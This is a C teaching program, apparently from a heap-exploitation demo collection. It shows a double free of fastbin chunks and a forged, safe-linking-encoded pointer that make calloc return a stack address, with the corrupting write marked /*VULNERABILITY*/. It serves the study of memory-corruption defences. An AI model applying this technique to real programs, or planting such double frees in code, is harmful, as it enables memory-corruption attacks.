#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking calloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");


	fprintf(stderr,"Fill up tcache first.\n");

	void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}


	unsigned long stack_var[4] __attribute__ ((aligned (0x10)));

	fprintf(stderr, "The address we want calloc() to return is %p.\n", stack_var + 2);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = calloc(1,8);
	int *b = calloc(1,8);
	int *c = calloc(1,8);

	fprintf(stderr, "1st calloc(1,8): %p\n", a);
	fprintf(stderr, "2nd calloc(1,8): %p\n", b);
	fprintf(stderr, "3rd calloc(1,8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n"); //First call to free will add a reference to the fastbin
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	//Calling free(a) twice renders the program vulnerable to Double Free

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long *d = calloc(1,8);

	fprintf(stderr, "1st calloc(1,8): %p\n", d);
	fprintf(stderr, "2nd calloc(1,8): %p\n", calloc(1,8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that calloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var[1] = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	fprintf(stderr, "Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.\n");
	fprintf(stderr, "^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\n");
	unsigned long ptr = (unsigned long)stack_var;
	unsigned long addr = (unsigned long) d;
	/*VULNERABILITY*/
	*d = (addr >> 12) ^ ptr;
	/*VULNERABILITY*/

	fprintf(stderr, "3rd calloc(1,8): %p, putting the stack address on the free list\n", calloc(1,8));

	void *p = calloc(1,8);

	fprintf(stderr, "4th calloc(1,8): %p\n", p);
	assert((unsigned long)p == (unsigned long)stack_var + 0x10);
}
